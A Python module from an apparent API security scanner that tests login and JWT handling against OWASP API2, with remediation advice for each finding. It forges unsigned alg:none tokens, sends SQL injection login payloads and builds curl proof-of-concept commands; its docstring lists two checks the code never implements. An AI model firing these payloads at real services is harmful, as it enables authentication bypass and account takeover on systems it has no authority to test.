"""
tools/auth_tester.py
====================
Security Tool 1 — Authentication & JWT Security Testing

Tests for OWASP API2:2019 Broken User Authentication.

Test cases
----------
1. Register a test user and attempt login → capture JWT
2. Decode JWT header/payload — check for ``alg: none`` or HS256 with weak secret
3. Craft a token with tampered claims (different username, admin=true)
4. Access protected endpoint without token → expect 401
5. Access protected endpoint with malformed/expired token
6. Try login with SQL injection payloads in credentials
7. Check if JWT contains sensitive data (passwords, secrets)
"""

from __future__ import annotations

import base64
import json
import time
import uuid
from typing import List, Optional, Tuple

from models.vulnerability import (
    CVSSScore,
    HTTPEvidence,
    OWASPCategory,
    Severity,
    TestStatus,
    VulnerabilityFinding,
)
from utils.http_client import HTTPClient
from utils.logger import get_logger

logger = get_logger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_TEST_USER_PREFIX = "sectest_"

_JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "vampi", "vampi-secret",
    "jwt-secret", "changeme", "supersecret", "key", "",
]


class AuthTester:
    """
    Tests authentication mechanisms for OWASP API2 vulnerabilities.

    Parameters
    ----------
    client:
        Configured ``HTTPClient`` for the target application.
    base_url:
        Base URL of the target application.
    """

    def __init__(self, client: HTTPClient, base_url: str) -> None:
        self._client = client
        self._base_url = base_url.rstrip("/")
        self._test_username = f"{_TEST_USER_PREFIX}{uuid.uuid4().hex[:8]}"
        self._test_password = "SecTest@2024!"
        self._jwt_token: Optional[str] = None
        self._findings: List[VulnerabilityFinding] = []
        self._vuln_counter = 0

    # ── Public interface ────────────────────────────────────────────────────

    def run(self) -> List[VulnerabilityFinding]:
        """Execute all authentication tests and return findings."""
        logger.info("AuthTester: starting authentication tests")

        try:
            self._setup_test_user()
        except Exception as exc:
            logger.warning("AuthTester: could not create test user", error=str(exc))
            # Continue with tests that don't require a registered user

        self._test_missing_token()
        self._test_malformed_token()
        self._test_jwt_algorithm_none()
        self._test_jwt_sensitive_data()
        self._test_auth_bypass_sql_in_credentials()
        self._test_login_without_registration()

        logger.info(
            "AuthTester: complete",
            findings=len(self._findings),
        )
        return self._findings

    # ── Setup ───────────────────────────────────────────────────────────────

    def _setup_test_user(self) -> None:
        """Register and log in a temporary test user to capture a JWT."""
        reg_body = {
            "username": self._test_username,
            "password": self._test_password,
            "email": f"{self._test_username}@sectest.invalid",
        }

        reg_resp = self._client.post(
            "/users/v1/register",
            json=reg_body,
            headers={"Content-Type": "application/json"},
        )
        logger.debug(
            "AuthTester: registered test user",
            username=self._test_username,
            status=reg_resp.status_code,
        )

        # Attempt login to capture JWT
        login_body = {
            "username": self._test_username,
            "password": self._test_password,
        }
        login_resp = self._client.post(
            "/users/v1/login",
            json=login_body,
            headers={"Content-Type": "application/json"},
        )

        if login_resp.status_code == 200:
            try:
                data = json.loads(login_resp.text)
                self._jwt_token = (
                    data.get("auth_token")
                    or data.get("token")
                    or data.get("access_token")
                    or data.get("jwt")
                )
                logger.info("AuthTester: JWT captured", token_length=len(self._jwt_token or ""))
            except Exception:
                logger.warning("AuthTester: could not parse JWT from login response")

    # ── Test: Missing token ────────────────────────────────────────────────

    def _test_missing_token(self) -> None:
        """
        Test 1: Confirm that protected endpoints return 401 when no
        Authorization header is provided.
        """
        resp = self._client.get("/me")
        ev = HTTPEvidence(
            method="GET",
            url=f"{self._base_url}/me",
            response_status=resp.status_code,
            response_body=self._safe_json(resp.text),
        )

        if resp.status_code not in (401, 403):
            self._add_finding(
                title="Protected Endpoint Accessible Without Authentication",
                owasp=OWASPCategory.API2_BROKEN_AUTH,
                endpoint="/me",
                method="GET",
                cvss=CVSSScore.from_score(
                    9.1,
                    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                ),
                status=TestStatus.VULNERABLE,
                confirmed=True,
                description=(
                    "The /me endpoint returned HTTP "
                    f"{resp.status_code} without an Authorization token. "
                    "Protected endpoints must require valid authentication."
                ),
                impact="Unauthenticated users can access user profile data.",
                poc=f"curl -X GET {self._base_url}/me\n# Expected: 401, Got: {resp.status_code}",
                evidence=[ev],
                remediation=[
                    "Enforce JWT validation middleware on all protected routes.",
                    "Return HTTP 401 with WWW-Authenticate: Bearer for unauthenticated requests.",
                ],
            )
        else:
            logger.info("AuthTester: /me correctly returns 401 without token")

    # ── Test: Malformed token ──────────────────────────────────────────────

    def _test_malformed_token(self) -> None:
        """
        Test 2: Malformed / random JWT should be rejected.
        """
        fake_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJoYWNrZXIifQ.INVALID_SIG"
        resp = self._client.get(
            "/me",
            headers={"Authorization": f"Bearer {fake_token}"},
        )
        ev = HTTPEvidence(
            method="GET",
            url=f"{self._base_url}/me",
            request_headers={"Authorization": f"Bearer {fake_token[:20]}..."},
            response_status=resp.status_code,
            response_body=self._safe_json(resp.text),
        )

        if resp.status_code == 200:
            self._add_finding(
                title="Malformed JWT Token Accepted",
                owasp=OWASPCategory.API2_BROKEN_AUTH,
                endpoint="/me",
                method="GET",
                cvss=CVSSScore.from_score(
                    9.1,
                    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                ),
                status=TestStatus.VULNERABLE,
                confirmed=True,
                description="The API accepted a malformed JWT with an invalid signature.",
                impact="Attackers can forge arbitrary JWT tokens to impersonate any user.",
                poc=f"curl -H 'Authorization: Bearer {fake_token}' {self._base_url}/me",
                evidence=[ev],
                remediation=[
                    "Validate JWT signature using a strong secret or asymmetric key.",
                    "Reject tokens with invalid signatures with HTTP 401.",
                ],
            )

    # ── Test: Algorithm None ───────────────────────────────────────────────

    def _test_jwt_algorithm_none(self) -> None:
        """
        Test 3: Craft an ``alg: none`` JWT (no signature) and attempt to access
        a protected endpoint.
        """
        # Build unsigned JWT
        header = base64.urlsafe_b64encode(
            b'{"alg":"none","typ":"JWT"}'
        ).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps({"sub": self._test_username, "admin": False}).encode()
        ).rstrip(b"=").decode()
        none_token = f"{header}.{payload}."  # empty signature

        resp = self._client.get(
            "/me",
            headers={"Authorization": f"Bearer {none_token}"},
        )
        ev = HTTPEvidence(
            method="GET",
            url=f"{self._base_url}/me",
            request_headers={"Authorization": "Bearer <alg:none token>"},
            response_status=resp.status_code,
            response_body=self._safe_json(resp.text),
        )

        if resp.status_code == 200:
            self._add_finding(
                title="JWT Algorithm 'none' Accepted — Authentication Bypass",
                owasp=OWASPCategory.API2_BROKEN_AUTH,
                endpoint="/me",
                method="GET",
                cvss=CVSSScore.from_score(
                    9.8,
                    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                ),
                status=TestStatus.VULNERABLE,
                confirmed=True,
                description=(
                    "The JWT library accepted a token with alg=none and no signature. "
                    "This is a critical misconfiguration that allows complete authentication bypass."
                ),
                impact="Any attacker can create unsigned tokens and authenticate as any user.",
                poc=(
                    f"# Header: {{\"alg\":\"none\",\"typ\":\"JWT\"}}\n"
                    f"# Payload: {{\"sub\":\"{self._test_username}\"}}\n"
                    f"# Token: {none_token}\n"
                    f"curl -H 'Authorization: Bearer {none_token}' {self._base_url}/me"
                ),
                evidence=[ev],
                remediation=[
                    "Explicitly reject 'none' algorithm in JWT library configuration.",
                    "Use PyJWT with algorithms=['HS256'] and never allow the 'none' algorithm.",
                    "Pin the expected algorithm in the validation step.",
                ],
            )
        else:
            logger.info("AuthTester: alg:none token correctly rejected")

    # ── Test: Sensitive data in JWT ────────────────────────────────────────

    def _test_jwt_sensitive_data(self) -> None:
        """
        Test 4: Decode captured JWT and check if it contains sensitive
        data (passwords, secrets, admin flags in plaintext).
        """
        if not self._jwt_token:
            logger.debug("AuthTester: skipping JWT inspection — no token captured")
            return

        try:
            parts = self._jwt_token.split(".")
            if len(parts) < 2:
                return

            # Decode payload (add padding)
            padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(padded).decode("utf-8", errors="replace"))

            sensitive_keys = {"password", "secret", "passwd", "pwd", "hash", "salt"}
            found_sensitive = {k: v for k, v in payload.items() if k.lower() in sensitive_keys}

            if found_sensitive:
                self._add_finding(
                    title="Sensitive Data Stored in JWT Payload",
                    owasp=OWASPCategory.API2_BROKEN_AUTH,
                    endpoint="/users/v1/login",
                    method="POST",
                    cvss=CVSSScore.from_score(
                        7.5,
                        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                    ),
                    status=TestStatus.VULNERABLE,
                    confirmed=True,
                    description=(
                        f"The JWT payload contains sensitive fields: {list(found_sensitive.keys())}. "
                        "JWT payloads are base64-encoded (not encrypted) and trivially readable."
                    ),
                    impact="Sensitive credentials or secrets exposed to any party that intercepts the token.",
                    poc=(
                        f"import base64, json\n"
                        f"payload = '{parts[1]}'\n"
                        f"# Add padding\n"
                        f"padded = payload + '=' * (4 - len(payload) % 4)\n"
                        f"print(json.loads(base64.urlsafe_b64decode(padded)))\n"
                        f"# Reveals: {found_sensitive}"
                    ),
                    evidence=[],
                    remediation=[
                        "Never store passwords, hashes, or secrets in JWT payloads.",
                        "Store only non-sensitive identifiers (user ID, username) in JWT claims.",
                        "Use JWE (JSON Web Encryption) if payload confidentiality is required.",
                    ],
                )
            else:
                logger.info(
                    "AuthTester: JWT payload clean",
                    fields=list(payload.keys()),
                )

        except Exception as exc:
            logger.warning("AuthTester: JWT decode error", error=str(exc))

    # ── Test: SQL injection in login credentials ───────────────────────────

    def _test_auth_bypass_sql_in_credentials(self) -> None:
        """
        Test 5: Submit SQL injection payloads in login credentials to
        attempt authentication bypass.
        """
        payloads = [
            ("' OR '1'='1", "anything"),
            ("admin'--", "anything"),
            ("' OR 1=1--", "x"),
        ]

        for username_payload, password in payloads:
            try:
                resp = self._client.post(
                    "/users/v1/login",
                    json={"username": username_payload, "password": password},
                    headers={"Content-Type": "application/json"},
                )
                ev = HTTPEvidence(
                    method="POST",
                    url=f"{self._base_url}/users/v1/login",
                    request_body={"username": username_payload, "password": "***"},
                    response_status=resp.status_code,
                    response_body=self._safe_json(resp.text),
                )

                if resp.status_code == 200:
                    body = self._safe_json(resp.text)
                    if isinstance(body, dict) and (
                        "auth_token" in body or "token" in body or "access_token" in body
                    ):
                        self._add_finding(
                            title="Authentication Bypass via SQL Injection in Login",
                            owasp=OWASPCategory.API8_INJECTION,
                            endpoint="/users/v1/login",
                            method="POST",
                            cvss=CVSSScore.from_score(
                                9.8,
                                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            ),
                            status=TestStatus.VULNERABLE,
                            confirmed=True,
                            description=(
                                "SQL injection in the login username parameter returned a valid "
                                f"authentication token. Payload: '{username_payload}'"
                            ),
                            impact="Complete authentication bypass; attacker can log in as any user.",
                            poc=(
                                f"curl -X POST {self._base_url}/users/v1/login \\\n"
                                f"  -H 'Content-Type: application/json' \\\n"
                                f"  -d '{{\"username\":\"{username_payload}\",\"password\":\"anything\"}}'"
                            ),
                            evidence=[ev],
                            remediation=[
                                "Use parameterised queries / prepared statements.",
                                "Validate and sanitise all user-supplied input before database queries.",
                                "Implement an ORM to prevent raw SQL concatenation.",
                            ],
                        )
                        return
            except Exception as exc:
                logger.debug("AuthTester: SQL login test error", error=str(exc))

    # ── Test: Login without registration ──────────────────────────────────

    def _test_login_without_registration(self) -> None:
        """
        Test 6: Attempt login with a non-existent username and check error
        messages for information disclosure.
        """
        fake_user = f"nonexistent_{uuid.uuid4().hex[:6]}"
        resp = self._client.post(
            "/users/v1/login",
            json={"username": fake_user, "password": "wrongpass"},
            headers={"Content-Type": "application/json"},
        )

        try:
            body = json.loads(resp.text)
            body_text = json.dumps(body).lower()
        except Exception:
            body_text = (resp.text or "").lower()

        # Check for information disclosure in error messages
        disclosure_terms = ["not found", "does not exist", "no user", "invalid username"]
        if any(term in body_text for term in disclosure_terms):
            self._add_finding(
                title="User Enumeration via Login Error Messages",
                owasp=OWASPCategory.API2_BROKEN_AUTH,
                endpoint="/users/v1/login",
                method="POST",
                cvss=CVSSScore.from_score(
                    5.3,
                    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                ),
                status=TestStatus.VULNERABLE,
                confirmed=True,
                description=(
                    f"Login error for non-existent user reveals account existence. "
                    f"Response: {resp.text[:200]}"
                ),
                impact="Attackers can enumerate valid usernames by observing error message differences.",
                poc=(
                    f"curl -X POST {self._base_url}/users/v1/login \\\n"
                    f"  -d '{{\"username\":\"{fake_user}\",\"password\":\"x\"}}'\n"
                    f"# Response reveals: user does not exist"
                ),
                evidence=[
                    HTTPEvidence(
                        method="POST",
                        url=f"{self._base_url}/users/v1/login",
                        request_body={"username": fake_user, "password": "x"},
                        response_status=resp.status_code,
                        response_body=self._safe_json(resp.text),
                    )
                ],
                remediation=[
                    "Return a generic error message for all failed login attempts.",
                    "Use the same response for wrong username and wrong password.",
                    "Implement account lockout after N failed attempts.",
                ],
            )

    # ── Helpers ─────────────────────────────────────────────────────────────

    def _next_vuln_id(self) -> str:
        self._vuln_counter += 1
        return f"AUTH-{self._vuln_counter:03d}"

    def _add_finding(
        self,
        title: str,
        owasp: OWASPCategory,
        endpoint: str,
        method: str,
        cvss: CVSSScore,
        status: TestStatus,
        confirmed: bool,
        description: str,
        impact: str,
        poc: str,
        evidence: list,
        remediation: list,
        references: Optional[List[str]] = None,
    ) -> None:
        finding = VulnerabilityFinding(
            vuln_id=self._next_vuln_id(),
            title=title,
            owasp_category=owasp,
            endpoint=endpoint,
            method=method,
            cvss=cvss,
            status=status,
            confirmed=confirmed,
            description=description,
            impact=impact,
            proof_of_concept=poc,
            evidence=evidence,
            remediation=remediation,
            references=references or [
                "https://owasp.org/API-Security/editions/2019/en/0xa2-broken-user-authentication/",
                "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
            ],
        )
        self._findings.append(finding)
        logger.info(
            "AuthTester: finding added",
            title=title,
            severity=cvss.severity.value,
            confirmed=confirmed,
        )

    @staticmethod
    def _safe_json(text: str) -> Any:
        try:
            return json.loads(text)
        except Exception:
            return text[:500] if text else None
